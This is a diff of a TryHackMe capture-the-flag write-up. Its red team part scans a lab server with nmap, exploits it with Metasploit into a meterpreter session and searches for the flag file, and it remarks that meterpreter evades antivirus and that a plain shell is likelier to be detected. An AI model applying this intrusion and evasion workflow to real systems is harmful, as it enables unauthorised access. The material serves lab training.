@@ -3,6 +3,8 @@ Try Hack Me Write Up
 Hack the Server and blue team
 tags: Metasploit splunk
 
+# Part 1: Red Team
+
 First were gonna run nmap to scan the ip address
 
 `nmap -T4 -p- -A -oN nmap.txt <ip address>`
@@ -27,24 +29,55 @@ This is where I open metasploit
 
 Now we need to set Lhost local machine and Rhost remote machine used to define target and attacker machine...
 
-`
-set RHOSTS [Target_IP] could be a range too
+`set RHOSTS [Target_IP] could be a range too
 
-set LHOST [Your_IP]
-`
+set LHOST [Your_IP]`
 
 
-After checking and making sure I would be able to run the exploit I was getting some problems and I relized we the automatic port it was set to was the wrong one. I the begning we saw it was port 5000... 
+After checking and making sure I would be able to run the exploit I was getting some problems and I realized we the automatic port it was set to was the wrong one. I the begning we saw it was port 5000... 
 
 so now we 
-`set RPORT 5000`
+`set RPORT 50000`
 ![TryHackMe Screenshot2](sc3.png)
 
-I was wrong didn't work...
+<img width="1153" height="74" alt="Image" src="https://github.com/user-attachments/assets/0b5d1a9a-327f-490c-978c-a81204efd781" />
+nice lets continue on with the attack...
+
+Was having some problems so I restarted metasploit and it worked...
+
+<img width="1430" height="299" alt="Image" src="https://github.com/user-attachments/assets/f1cd75e8-12f2-4577-8f3c-dd0d0bf4a65a" />
+
+Now we got the meterpreter!! Thats amazing the meteperpreter is way better than just a reverse shell it lives entirely in the ram and doesn't write to disk. Meaning we are in full ghost mode. Makes antivirus hard to get it and we are still communicating over an encrypted channel...
 
 
+so now I can do commands like 
+`ls
+pwd
+Search entire system ignoring errors(my favorite) you do have to run shell first
+
+shell
 
 
+find / -name "flag.txt" 2>/dev/null`
 
 
+meterpreter also can run commands like 
+
+`search [filename]`
+
+
+but sometimes its not the best you can see here it didn't actually work... 
+
+
+And boom We got it.
+
+
+##IMPORTANT
+
+
+next time popping open a shell is more risky becuase now that process can be logged and detected by lets say crowdstrike for unusual detection... then using meterpreter.
+<img width="798" height="307" alt="Image" src="https://github.com/user-attachments/assets/d559f4ff-4e15-4f3b-b8d7-4b823f79cc13" />
+
+
+# Part 2: Blue Team
 
